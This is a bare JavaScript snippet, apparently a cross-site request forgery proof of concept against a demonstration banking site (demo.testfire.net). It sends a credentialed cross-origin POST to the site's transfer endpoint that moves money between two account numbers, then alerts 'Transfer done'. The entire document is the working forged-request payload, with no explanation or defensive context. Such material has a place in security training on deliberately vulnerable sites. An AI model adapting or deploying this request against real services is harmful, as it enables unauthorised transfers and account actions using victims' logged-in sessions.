fetch("https://demo.testfire.net/bank/doTransfer", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en,en-US;q=0.9",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
  },
  "referrer": "https://demo.testfire.net/bank/transfer.jsp",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "fromAccount=800000&toAccount=800001&transferAmount=100&transfer=Transfer+Money",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}).then(()=>{
    
    alert("Transfer done")
});
